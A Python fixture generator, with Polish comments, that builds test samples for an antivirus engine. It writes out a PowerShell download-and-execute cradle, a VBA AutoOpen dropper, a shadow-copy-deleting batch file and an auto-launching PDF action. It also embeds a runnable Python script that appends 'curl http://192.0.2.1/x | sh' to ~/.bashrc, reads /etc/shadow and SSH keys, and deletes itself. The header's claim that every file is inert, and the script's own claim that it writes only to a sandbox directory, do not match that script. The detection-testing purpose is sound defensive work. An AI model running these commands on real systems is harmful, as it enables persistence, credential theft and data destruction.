#!/usr/bin/env python3
"""Generator PRÓBEK TESTOWYCH (fixtures) do testowania silnika.

Wszystkie tworzone pliki są całkowicie nieaktywne: nie zawierają działającego
kodu, nie łączą się z siecią i nie modyfikują systemu. Mają jedynie strukturę
i cechy statyczne typowe dla malware, żeby można było sprawdzić, czy silnik
je wykrywa. Nie uruchamiaj ich.

Użycie:
    python3 tools/make_samples.py            # tworzy samples/
    python3 tools/make_samples.py --verify   # dodatkowo wypisuje analizę
"""

from __future__ import annotations

import argparse
import os
import random
import struct
import sys
from pathlib import Path

REPO = Path(__file__).resolve().parent.parent
SAMPLES = REPO / "samples"

EICAR = (
    r"X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*"
)


# ---------------------------------------------------------------------------
# minimalny konstruktor PE (tylko nagłówki + sekcje, bez działającego kodu)
# ---------------------------------------------------------------------------

class PEBuilder:
    """Buduje POPRAWNY STRUKTURALNIE plik PE32 (do analizy statycznej).

    Plik nie nadaje się do uruchomienia - w sekcjach są dane testowe, a entry
    point wskazuje na nieistniejący kod. Celem jest dostarczenie realistycznej
    struktury dla parserów, nie działającego programu.
    """

    FILE_ALIGN = 0x200
    SECT_ALIGN = 0x1000

    def __init__(self, machine: int = 0x014C, image_base: int = 0x400000,
                 timestamp: int = 0) -> None:
        self.machine = machine
        self.image_base = image_base
        self.timestamp = timestamp
        self.sections: list[dict] = []          # name, data, flags, virtual_size
        self.imports: dict[str, list[str]] = {}
        self.entry_rva = 0x1000

    def add_section(self, name: str, data: bytes, flags: int,
                    virtual_size: int | None = None) -> None:
        self.sections.append({
            "name": name,
            "data": data,
            "flags": flags,
            "virtual_size": virtual_size,
        })

    def add_imports(self, imports: dict[str, list[str]]) -> None:
        self.imports = imports

    # ------------------------------------------------------------------ build
    def build(self) -> bytes:
        dos_stub = b"\x0e\x1f\xba\x0e\x00\xb4\x09\xcd\x21\xb8\x01\x4c\xcd\x21" + \
                   b"This program cannot be run in DOS mode.\r\r\n$" + b"\x00" * 3

        n_sections = len(self.sections) + (1 if self.imports else 0)
        opt_size = 224
        pe_off = 0x80
        coff_off = pe_off + 4
        opt_off = coff_off + 20
        sect_off = opt_off + opt_size
        first_raw = self._align(sect_off + n_sections * 40, self.FILE_ALIGN)

        # --- układ sekcji w pliku i pamięci ---
        layout: list[dict] = []
        raw_ptr = first_raw
        rva = self.SECT_ALIGN
        for sec in self.sections:
            raw_size = self._align(len(sec["data"]), self.FILE_ALIGN) if sec["data"] else 0
            vsize = sec["virtual_size"] or max(len(sec["data"]), 0x1000)
            layout.append({
                **sec,
                "raw_ptr": raw_ptr if raw_size else 0,
                "raw_size": raw_size,
                "rva": rva,
                "vsize": self._align(vsize, self.SECT_ALIGN),
            })
            raw_ptr += raw_size
            rva += self._align(vsize, self.SECT_ALIGN)

        idata: bytes | None = None
        idata_entry: dict | None = None
        if self.imports:
            idata = self._build_import_table(rva)
            idata_entry = {
                "name": ".idata",
                "data": idata,
                "flags": 0x40000040,           # READ | INITIALIZED_DATA
                "raw_ptr": raw_ptr,
                "raw_size": self._align(len(idata), self.FILE_ALIGN),
                "rva": rva,
                "vsize": self._align(len(idata), self.SECT_ALIGN),
            }
            layout.append(idata_entry)
            rva += idata_entry["vsize"]

        size_of_headers = first_raw
        size_of_image = rva

        out = bytearray()

        # --- nagłówek DOS ---
        dos = bytearray(64)
        dos[0:2] = b"MZ"
        struct.pack_into("<H", dos, 0x3C, pe_off)   # e_lfanew
        out += dos
        out += dos_stub
        while len(out) < pe_off:
            out += b"\x00"

        # --- sygnatura PE + COFF ---
        out += b"PE\x00\x00"
        characteristics = 0x0102 | 0x0001          # EXECUTABLE_IMAGE | 32BIT | RELOCS_STRIPPED
        out += struct.pack(
            "<HHIIIHH",
            self.machine, n_sections, self.timestamp,
            0, 0,                                  # symbol table
            opt_size, characteristics,
        )

        # --- opcjonalny nagłówek PE32 ---
        opt = bytearray(opt_size)
        struct.pack_into("<H", opt, 0, 0x10B)                     # magic PE32
        struct.pack_into("<I", opt, 16, self.entry_rva)           # AddressOfEntryPoint
        struct.pack_into("<I", opt, 28, self.image_base)          # ImageBase
        struct.pack_into("<I", opt, 32, self.SECT_ALIGN)          # SectionAlignment
        struct.pack_into("<I", opt, 36, self.FILE_ALIGN)          # FileAlignment
        struct.pack_into("<HH", opt, 40, 4, 0)                    # OS version
        struct.pack_into("<HH", opt, 44, 0, 0)                    # image version
        struct.pack_into("<HH", opt, 48, 4, 0)                    # subsystem version
        struct.pack_into("<I", opt, 56, size_of_image)            # SizeOfImage
        struct.pack_into("<I", opt, 60, size_of_headers)          # SizeOfHeaders
        struct.pack_into("<I", opt, 68, 2)                        # subsystem = GUI
        struct.pack_into("<H", opt, 70, 0x100)                    # DllCharacteristics
        struct.pack_into("<I", opt, 72, 0x100000)                 # SizeOfStackReserve
        struct.pack_into("<I", opt, 76, 0x1000)                   # SizeOfStackCommit
        struct.pack_into("<I", opt, 80, 0x100000)                 # SizeOfHeapReserve
        struct.pack_into("<I", opt, 84, 0x1000)                   # SizeOfHeapCommit
        struct.pack_into("<I", opt, 88, 0)                        # LoaderFlags
        struct.pack_into("<I", opt, 92, 16)                       # NumberOfRvaAndSizes

        # Katalog danych zaczyna się na offsecie 96 i ma wpisy po 8 bajtów:
        # wpis [0] = eksport, [1] = import, [2] = zasoby...
        if idata_entry:
            struct.pack_into("<II", opt, 96 + 8, idata_entry["rva"], len(idata or b""))
        out += opt

        # --- tablica sekcji ---
        for sec in layout:
            name = sec["name"].encode()[:8].ljust(8, b"\x00")
            out += name
            out += struct.pack(
                "<IIIIIIHHI",
                sec["vsize"], sec["rva"], sec["raw_size"], sec["raw_ptr"],
                0, 0, 0, 0, sec["flags"],
            )

        # --- dane sekcji ---
        for sec in layout:
            if len(out) < sec["raw_ptr"]:
                out += b"\x00" * (sec["raw_ptr"] - len(out))
            if sec["data"]:
                out += sec["data"]
                pad = sec["raw_size"] - len(sec["data"])
                if pad > 0:
                    out += b"\x00" * pad

        return bytes(out)

    def _build_import_table(self, base_rva: int) -> bytes:
        """Buduje tablicę importów (deskryptory + INT/IAT + nazwy)."""
        dlls = list(self.imports.items())
        n_desc = len(dlls) + 1

        desc_size = n_desc * 20
        int_sizes = [(len(fns) + 1) * 4 for _, fns in dlls]
        iat_sizes = [(len(fns) + 1) * 4 for _, fns in dlls]
        int_off = desc_size
        iat_off = int_off + sum(int_sizes)

        names_blob = bytearray()
        name_rva: dict[str, int] = {}
        hint_rva: dict[tuple[str, str], int] = {}

        cursor = iat_off + sum(iat_sizes)
        for dll, fns in dlls:
            dll_rva = base_rva + cursor
            names_blob += dll.encode() + b"\x00"
            cursor += len(dll) + 1
            name_rva[dll] = dll_rva
            for fn in fns:
                while (cursor % 2) != 0:
                    names_blob += b"\x00"
                    cursor += 1
                hint_rva[(dll, fn)] = base_rva + cursor
                names_blob += struct.pack("<H", 0) + fn.encode() + b"\x00"
                cursor += 2 + len(fn) + 1

        total = cursor
        buf = bytearray(total)

        # deskryptory
        int_cursor = int_off
        iat_cursor = iat_off
        for idx, (dll, fns) in enumerate(dlls):
            struct.pack_into("<IIIII", buf, idx * 20,
                             base_rva + int_cursor, 0, 0,
                             name_rva[dll], base_rva + iat_cursor)
            for fn in fns:
                rva = hint_rva[(dll, fn)]
                struct.pack_into("<I", buf, int_cursor, rva)
                struct.pack_into("<I", buf, iat_cursor, rva)
                int_cursor += 4
                iat_cursor += 4
            int_cursor += 4
            iat_cursor += 4

        buf[cursor - len(names_blob):cursor] = names_blob
        return bytes(buf)

    @staticmethod
    def _align(value: int, alignment: int) -> int:
        return ((value + alignment - 1) // alignment) * alignment


# ---------------------------------------------------------------------------
# scenariusze testowe
# ---------------------------------------------------------------------------

def make_legit_pe() -> bytes:
    """Zwykły plik wykonywalny: standardowe sekcje, niska entropia, zwykłe importy."""
    pe = PEBuilder(timestamp=0x5F5E1000)  # 2020-09-10
    pe.entry_rva = 0x1000
    pe.add_section(".text", bytes(0x400), 0x60000020)     # CODE|EXECUTE|READ
    pe.add_section(".rdata", b"Hello, world!\x00" * 32, 0x40000040)
    pe.add_section(".data", b"\x00" * 0x200, 0xC0000040)
    pe.add_imports({
        "kernel32.dll": ["ExitProcess", "GetStdHandle", "WriteConsoleA"],
        "user32.dll": ["MessageBoxA"],
    })
    return pe.build()


def make_packed_pe() -> bytes:
    """Pakowany dropper: sekcje UPX0/UPX1 (W+X), wysoka entropia, importy loaderowe."""
    pe = PEBuilder(timestamp=0)
    pe.entry_rva = 0x3000                                     # w ostatniej sekcji (UPX1)
    pe.add_section("UPX0", b"", 0xE0000080, virtual_size=0x20000)   # W+X, raw=0
    pe.add_section("UPX1", fixture_bytes(0x800), 0xE0000080)           # W+X, losowe dane
    pe.add_imports({
        "kernel32.dll": ["VirtualAllocEx", "WriteProcessMemory", "CreateRemoteThread",
                         "LoadLibraryA", "GetProcAddress", "VirtualAlloc", "IsDebuggerPresent"],
        "ws2_32.dll": ["connect", "send", "recv"],
    })
    return pe.build()


def make_clean_txt() -> bytes:
    return ("Notatka służbowa\n"
            "================\n\n"
            "Spotkanie: poniedziałek, 10:00, pokój 214.\n"
            "Do omówienia: budżet na czwarty kwartał oraz harmonogram wdrożenia.\n").encode()


def make_encoded_ps1() -> bytes:
    """Skrypt PowerShell o cechach typowego droppu (nie uruchamia się sam)."""
    return (
        b"$s = New-Object Net.WebClient;\n"
        b"$u = 'http://185.220.101.7/a/update'\n"
        b"$d = $s.DownloadString($u)\n"
        b"Invoke-Expression $d\n"
        b"powershell -ExecutionPolicy Bypass -WindowStyle Hidden -NoProfile "
        b"-EncodedCommand JABzAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQA\n"
    )


def make_ransom_bat() -> bytes:
    return (
        b"@echo off\n"
        b"vssadmin delete shadows /all /quiet\n"
        b"wmic shadowcopy delete\n"
        b"bcdedit /set {default} recoveryenabled no\n"
        b"certutil -decode payload.b64 payload.exe\n"
        b"schtasks /create /sc minute /mo 1 /tn Updater /tr C:\\Users\\Public\\payload.exe\n"
        b"cipher /w:C\n"
    )


def _zip_add(zf, name: str, data: bytes) -> None:
    """Dodaje wpis do ZIP ze STAŁYM znacznikiem czasu.

    Domyślnie zipfile wpisuje bieżącą datę, przez co każde wygenerowanie
    fixture'a dawałoby inny plik - a odtąd git widziałby zmiany, których nie
    ma. To ten sam powód, dla którego używamy ziarnowanego RNG.
    """
    import zipfile
    info = zipfile.ZipInfo(name, date_time=(2024, 1, 1, 12, 0, 0))
    info.compress_type = zipfile.ZIP_DEFLATED
    info.external_attr = 0o600 << 16
    zf.writestr(info, data)


def make_docm_with_macro() -> bytes:
    """Dokument Office z projektem VBA (.docm) - NIE zawiera działającego kodu.

    Wzorowany na realnym łańcuchu: AutoOpen -> WScript.Shell -> PowerShell
    pobierający kolejny etap. Ciągi są zwykłym tekstem, nic się nie wykonuje.
    """
    import io
    import zipfile

    vba = (
        b"Sub AutoOpen()\r\n"
        b"    Dim sh As Object\r\n"
        b"    Set sh = CreateObject(\"WScript.Shell\")\r\n"
        b"    Dim cmd As String\r\n"
        b"    cmd = \"powershell -ExecutionPolicy Bypass -WindowStyle Hidden \" _\r\n"
        b"        & \"-EncodedCommand JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAA\"\r\n"
        b"    cmd = cmd & \"System.Net.WebClient\"\r\n"
        b"    sh.Run cmd, 0, False\r\n"
        b"    URLDownloadToFile 0, \"http://185.220.101.7/upd/loader.exe\", \"\" _\r\n"
        b"        & Environ(\"TEMP\") & \"\\\\upd.exe\", 0, 0\r\n"
        b"    Application.DisplayAlerts = False\r\n"
        b"    Dim b As String: b = StrReverse(\"exe.dllor\")\r\n"
        b"End Sub\r\n"
    )
    document = (
        b'<?xml version="1.0" encoding="UTF-8" standalone="yes"?>\r\n'
        b'<w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main">'
        b'<w:body><w:p><w:r><w:t>Faktura VAT nr 12/2026</w:t></w:r></w:p></w:body></w:document>'
    )
    content_types = (
        b'<?xml version="1.0" encoding="UTF-8" standalone="yes"?>'
        b'<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">'
        b'<Default Extension="bin" ContentType="application/vnd.ms-office.vbaproject"/>'
        b'</Types>'
    )
    rels = (
        b'<?xml version="1.0" encoding="UTF-8" standalone="yes"?>'
        b'<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">'
        b'<Relationship Id="rId1" Type="http://schemas.microsoft.com/office/2006/relationships/ui/extensibility"/>'
        b'</Relationships>'
    )

    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as zf:
        _zip_add(zf, "[Content_Types].xml", content_types)
        _zip_add(zf, "_rels/.rels", rels)
        _zip_add(zf, "word/document.xml", document)
        _zip_add(zf, "word/vbaProject.bin", vba)
    return buf.getvalue()


def make_clean_docx() -> bytes:
    """Zwykły dokument .docx bez makr."""
    import io
    import zipfile
    document = (
        b'<?xml version="1.0" encoding="UTF-8" standalone="yes"?>'
        b'<w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main">'
        b'<w:body><w:p><w:r><w:t>Notatka ze spotkania</w:t></w:r></w:p></w:body></w:document>'
    )
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as zf:
        _zip_add(zf, "[Content_Types].xml",
                 b'<?xml version="1.0"?><Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types"/>')
        _zip_add(zf, "word/document.xml", document)
    return buf.getvalue()


def make_pdf(objects: list, root: int = 1) -> bytes:
    """Minimalny, ale POPRAWNY strukturalnie plik PDF (z tablicą xref).

    To ważne: PDF bez tablicy xref i `startxref` jest obiektem uszkodzonym,
    a reguły społecznościowe (np. invalid_trailer_structure) słusznie traktują
    to jako podejrzane. Jeśli fixture czystego pliku byłby uszkodzony, testy
    pokazywałyby fałszywy alarm nie dlatego, że skaner jest zły, tylko dlatego,
    że wzorzec jest zły.
    """
    out = bytearray(b"%PDF-1.7\n")
    offsets = []
    for idx, body in enumerate(objects, start=1):
        offsets.append(len(out))
        out += b"%d 0 obj\n" % idx + body + b"\nendobj\n"
    xref_offset = len(out)
    count = len(objects) + 1
    out += b"xref\n0 %d\n" % count
    out += b"0000000000 65535 f \n"          # wpis zerowy jest zawsze wolny
    for off in offsets:
        out += b"%010d 00000 n \n" % off
    out += (b"trailer\n<< /Size %d /Root %d 0 R >>\n" % (count, root))
    out += b"startxref\n%d\n%%%%EOF\n" % xref_offset
    return bytes(out)


def make_malicious_pdf() -> bytes:
    """PDF z JavaScriptem uruchamianym automatycznie (nie wykonuje się u nas)."""
    return make_pdf([
        b"<< /Type /Catalog /Pages 2 0 R /OpenAction 5 0 R >>",
        b"<< /Type /Pages /Kids [3 0 R] /Count 1 >>",
        b"<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] /Contents 4 0 R >>",
        b"<< /Length 44 >>\nstream\nBT /F1 12 Tf 72 700 Td (Faktura) Tj ET\nendstream",
        b"<< /Type /Action /S /JavaScript /JS "
        b"(app.launchURL('http://185.220.101.7/pay', true);) >>",
    ])


def make_clean_pdf() -> bytes:
    return make_pdf([
        b"<< /Type /Catalog /Pages 2 0 R >>",
        b"<< /Type /Pages /Kids [3 0 R] /Count 1 >>",
        b"<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] /Contents 4 0 R >>",
        b"<< /Length 46 >>\nstream\nBT /F1 12 Tf 72 700 Td (Raport kwartalny) Tj ET\nendstream",
    ])


# Ziarno stałe: fixture'y muszą być POWTARZALNE. Przy os.urandom każde
# uruchomienie skryptu generowałoby inne pliki, co zmieniałoby zawartość
# repozytorium i zaśmiecało historię gita przypadkowymi danymi.
_FIXTURE_RANDOM = random.Random(20240101)


def fixture_bytes(count: int) -> bytes:
    """Deterministyczne dane losowe - do fixture'ów, nie do kryptografii."""
    rng = _FIXTURE_RANDOM
    return bytes(rng.getrandbits(8) for _ in range(count))


BEHAVIOR_MALICIOUS = rb"""#!/usr/bin/env python3
# FIXTURE: skrypt pokazujacy ZACHOWANIE typowe dla malware.
# Nie jest zlosliwy: adres 192.0.2.x nalezy do zarezerwowanego zakresu
# testowego (RFC 5737) i zapisuje wylacznie we wlasnym katalogu piaskownicy.
# Sluzyl do testowania modulu analizy behawioralnej (avengine/behavior.py).
import os
import socket

home = os.environ.get("HOME", "/tmp")

# 1. utrwalenie: dopisanie do profilu powloki i folderu autostartu
with open(os.path.join(home, ".bashrc"), "a") as fh:
    fh.write("curl http://192.0.2.1/x | sh\n")
os.makedirs(os.path.join(home, ".config", "autostart"), exist_ok=True)
with open(os.path.join(home, ".config", "autostart", "updater.desktop"), "w") as fh:
    fh.write("[Desktop Entry]\nExec=/tmp/updater\n")

# 2. proba odczytu poswiadczen
for path in ("/etc/shadow", os.path.join(home, ".ssh", "id_rsa")):
    try:
        with open(path, "rb") as fh:
            fh.read(64)
    except Exception:
        pass

# 3. kontakt z C2 na porcie typowym dla shella zwrotnego
try:
    s = socket.socket()
    s.settimeout(1)
    s.connect(("192.0.2.1", 4444))
except Exception:
    pass

# 4. masowe zmiany plikow + zapis tresci o wysokiej entropii (ransomware)
for i in range(25):
    with open(os.path.join(home, "dokument_%d.txt" % i), "w") as fh:
        fh.write("dokument %d" % i)
with open(os.path.join(home, "dokument_zaszyfrowany.bin"), "wb") as fh:
    fh.write(os.urandom(8192))

# 5. zatarce sladow: usuniecie wlasnego pliku
try:
    os.remove(os.path.abspath(__file__))
except Exception:
    pass
print("done")
"""

BEHAVIOR_BENIGN = rb"""#!/bin/sh
# FIXTURE: zwyczajny skrypt - nie powinien wzbudzic zadnego podejrzenia.
echo "Hello world"
echo "Katalog domowy: $HOME"
"""


def write(path: Path, data: bytes) -> int:
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_bytes(data)
    return len(data)


def main() -> int:
    parser = argparse.ArgumentParser()
    parser.add_argument("--verify", action="store_true")
    args = parser.parse_args()

    created = [
        ("eicar.com", EICAR.encode("ascii")),
        ("clean/notatka.txt", make_clean_txt()),
        ("clean/program.exe", make_legit_pe()),
        ("malicious/packed_loader.exe", make_packed_pe()),
        ("suspicious/high_entropy_payload.bin", fixture_bytes(64 * 1024)),
        ("malicious/dropper.ps1", make_encoded_ps1()),
        ("malicious/ransom_note.bat", make_ransom_bat()),
        ("malicious/faktura.docm", make_docm_with_macro()),
        ("malicious/raport.pdf", make_malicious_pdf()),
        ("clean/raport.docx", make_clean_docx()),
        ("clean/dokument.pdf", make_clean_pdf()),
        ("malicious/behav_dropper.py", BEHAVIOR_MALICIOUS),
        ("clean/behav_benign.sh", BEHAVIOR_BENIGN),
    ]

    print(f"Katalog próbek: {SAMPLES}")
    for name, data in created:
        size = write(SAMPLES / name, data)
        print(f"  {name:42s} {size:>8,} B")

    if args.verify:
        print("\nWeryfikacja (cechy statyczne):")
        try:
            import pefile
            from avengine.entropy import shannon_entropy
            for name in ("clean/program.exe", "malicious/packed_loader.exe"):
                path = SAMPLES / name
                pe = pefile.PE(str(path))
                print(f"\n{name}:")
                for s in pe.sections:
                    raw = s.get_data() or b""
                    print(f"  {s.Name.rstrip(chr(0).encode()).decode():8s} "
                          f"raw={len(raw):6d} entropia={shannon_entropy(raw):.3f} "
                          f"flags=0x{s.Characteristics:08x}")
                for entry in getattr(pe, "DIRECTORY_ENTRY_IMPORT", []):
                    names = [i.name.decode() for i in entry.imports if i.name]
                    print(f"  importy {entry.dll.decode()}: {', '.join(names)}")
        except Exception as exc:
            print(f"  (weryfikacja niedostępna: {exc})")
    return 0


if __name__ == "__main__":
    sys.exit(main())
